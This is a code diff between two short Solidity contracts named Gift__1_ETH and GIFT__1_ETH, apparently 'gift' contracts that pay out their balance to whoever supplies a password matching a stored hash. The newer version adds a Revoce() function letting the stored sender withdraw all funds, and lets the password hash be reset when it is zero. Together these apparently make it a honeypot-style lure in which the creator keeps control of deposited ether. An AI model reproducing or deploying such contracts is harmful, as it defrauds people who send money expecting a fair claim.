@@ -1,30 +1,33 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Gift__1_ETH at 0x4876bca6feab4243e4370bddc92f5a8364de9df9
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GIFT__1_ETH at 0x9BdB9D9BD3e348D93453400e46e71dD519c60503
 */
-pragma solidity ^0.4.18;
+pragma solidity ^0.4.19;
 
-contract Gift__1_ETH
+contract GIFT__1_ETH
 {
     bool passHasBeenSet = false;
     
-    function()payable{}
-    
-    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
+    address sender;
     
     bytes32 public hashPass;
+	
+	function() public payable{}
+    
+    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
     
     function SetPass(bytes32 hash)
     public
     payable
     {
-        if(!passHasBeenSet&&(msg.value >= 1 ether))
+        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
         {
             hashPass = hash;
+            sender = msg.sender;
         }
     }
     
     function GetGift(bytes pass)
-    public
+    external
     payable
     {
         if(hashPass == sha3(pass))
@@ -33,10 +36,20 @@ contract Gift__1_ETH
         }
     }
     
+    function Revoce()
+    public
+    payable
+    {
+        if(msg.sender==sender)
+        {
+            sender.transfer(this.balance);
+        }
+    }
+    
     function PassHasBeenSet(bytes32 hash)
     public
     {
-        if(hash==hashPass)
+        if(msg.sender==sender&&hash==hashPass)
         {
            passHasBeenSet=true;
         }
